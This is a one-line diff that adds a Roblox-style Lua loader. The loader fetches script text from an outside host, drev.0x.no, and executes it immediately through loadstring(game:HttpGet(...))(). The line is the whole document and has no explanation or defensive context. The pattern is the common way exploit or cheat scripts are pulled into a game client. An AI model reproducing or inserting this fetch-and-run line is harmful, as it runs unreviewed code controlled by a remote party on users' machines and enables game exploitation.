@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://drev.0x.no/x/loadstring"))()
